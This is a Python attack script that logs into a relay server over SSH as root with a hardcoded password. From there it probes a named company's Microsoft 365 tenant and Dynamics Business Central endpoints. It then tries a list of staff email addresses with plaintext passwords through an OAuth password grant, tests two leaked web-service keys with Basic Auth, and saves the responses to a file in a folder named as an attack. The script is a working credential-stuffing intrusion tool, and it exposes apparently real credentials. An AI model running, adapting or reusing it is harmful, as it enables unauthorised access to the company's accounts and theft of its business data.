#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - Dynamics Business Central login attempts"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=2500):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

# BC creds
BC_CREDS = [
    ("admin@findep.global", "4dm1n##*2411"),
    ("admin@findep.global", "NosemepasaBC1#"),
    ("admin@findep.global", "F1SA2024*#"),
    ("admin@findep.global", "BcF1s42oo2d*C"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("jsanchezfern@findep.global", "Fisa2022*"),
    ("jeff@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2023*"),
]

# BC web service keys (Basic Auth)
BC_WS_KEYS = [
    ("ADMIN", "4p5pd2fz4MfAFz9gUEGw4BhzQxisOyriXD0xJUOa6dw=", "BC WS"),
    ("ADMIN", "Mb1WhzUUMmsUeq1lm4IWu2T+FCGn9cTT585Vx9uzAls=", "AFI WS"),
]

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}

    # 1. DNS resolution for findep.global variants
    print("\n[*] === DNS for findep.global variants ===")
    dns_targets = [
        "findep.global", "bc.findep.global",
        "findep.onmicrosoft.com", "findep365.com",
        "businesscentral.dynamics.com",
        "login.microsoftonline.com",
        "findep.sharepoint.com",
        "findep-my.sharepoint.com",
    ]
    dns_results = {}
    for h in dns_targets:
        out, _ = ssh_exec(client, f"host {h} 2>&1 | head -3", timeout=10)
        dns_results[h] = out.strip()
        print(f"  {h}: {out.strip()[:200]}")
    log["dns"] = dns_results

    # 2. Try Microsoft Online login (OAuth flow) - check if tenant exists
    print("\n[*] === Check Microsoft 365 tenant ===")
    # Get OpenID config for findep.global
    tenant_urls = [
        "https://login.microsoftonline.com/findep.global/.well-known/openid-configuration",
        "https://login.microsoftonline.com/findep.onmicrosoft.com/.well-known/openid-configuration",
        "https://login.microsoftonline.com/findep.global/v2.0/.well-known/openid-configuration",
        "https://login.microsoftonline.com/common/.well-known/openid-configuration",
    ]
    tenant_results = {}
    for url in tenant_urls:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -o /tmp/oidc.json -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        body, _ = ssh_exec(client, "head -c 3000 /tmp/oidc.json", timeout=10)
        tenant_results[url] = {"response": out.strip(), "body": body[:2000]}
        print(f"\n  {url}: {out.strip()}")
        if "HTTP:200" in out:
            safe_print(body[:1500])
    log["oidc"] = tenant_results

    # 3. Try Dynamics BC web service endpoints
    print("\n[*] === Dynamics BC Web Services ===")
    # BC SOAP/OData endpoints
    bc_ws_urls = [
        # Standard BC endpoints
        "https://businesscentral.dynamics.com/",
        "https://api.businesscentral.dynamics.com/",
        # Try findep.global directly
        "https://findep.global/",
        "https://bc.findep.global/",
        # Common BC API endpoints
        "https://api.businesscentral.dynamics.com/v2.0/findep.global/production",
        "https://api.businesscentral.dynamics.com/v2.0/findep.global/sandbox",
    ]
    bc_ws_results = {}
    for url in bc_ws_urls:
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -o /tmp/bc.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=20)
        body, _ = ssh_exec(client, "head -c 1500 /tmp/bc.html", timeout=10)
        bc_ws_results[url] = {"response": out.strip(), "body": body[:1000]}
        print(f"  {url}: {out.strip()}")
    log["bc_ws_probe"] = bc_ws_results

    # 4. Try BC login via Microsoft Online ROPC (Resource Owner Password Credentials)
    print("\n[*] === Microsoft Online ROPC (password grant) ===")
    ropsc_results = []
    for user, pwd in BC_CREDS:
        cmd = (f"curl -sk -m 20 -A 'Mozilla/5.0' -X POST "
               f"-H 'Content-Type: application/x-www-form-urlencoded' "
               f"-d 'client_id=1b730954-1685-4b74-9bfd-dacc224a3b57' "
               f"-d 'scope=https://api.businesscentral.dynamics.com/.default' "
               f"-d 'username={user}' "
               f"-d 'password={pwd}' "
               f"-d 'grant_type=password' "
               f"-o /tmp/ropsc.json -w 'HTTP:%{{http_code}} SIZE:%{{size_download}}' "
               f"'https://login.microsoftonline.com/findep.global/oauth2/v2.0/token'")
        out, _ = ssh_exec(client, cmd, timeout=25)
        body, _ = ssh_exec(client, "head -c 2000 /tmp/ropsc.json", timeout=10)
        print(f"  {user}:{pwd[:20]}... -> {out.strip()}")
        safe_print(f"    body: {body[:500]}")
        ropsc_results.append({"user": user, "password": pwd, "response": out.strip(), "body": body[:2000]})
        time.sleep(1)
    log["ropsc_results"] = ropsc_results

    # 5. Try BC web service with Basic Auth keys
    print("\n[*] === BC Web Service with Basic Auth keys ===")
    ws_results = []
    for user, key, label in BC_WS_KEYS:
        # Try common BC SOAP endpoints
        for url in [
            "https://businesscentral.dynamics.com/findep.global/WS/findep%20global/Page/Customers",
            "https://businesscentral.dynamics.com/findep.global/WS/findep%20global/Page/Vendors",
            "https://api.businesscentral.dynamics.com/v2.0/findep.global/production/api/beta/companies",
            "https://api.businesscentral.dynamics.com/v2.0/findep.global/production/ODataV4/Company",
        ]:
            cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -u '{user}:{key}' "
                   f"-o /tmp/ws.json -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}}' '{url}'")
            out, _ = ssh_exec(client, cmd, timeout=20)
            body, _ = ssh_exec(client, "head -c 1000 /tmp/ws.json", timeout=10)
            print(f"  [{label}] {url[-60:]}: {out.strip()}")
            if "HTTP:401" not in out and "HTTP:404" not in out and "HTTP:000" not in out:
                safe_print(f"    body: {body[:500]}")
            ws_results.append({"user": user, "key": key, "label": label, "url": url,
                               "response": out.strip(), "body": body[:1000]})
    log["ws_results"] = ws_results

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_bc.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] BC results saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
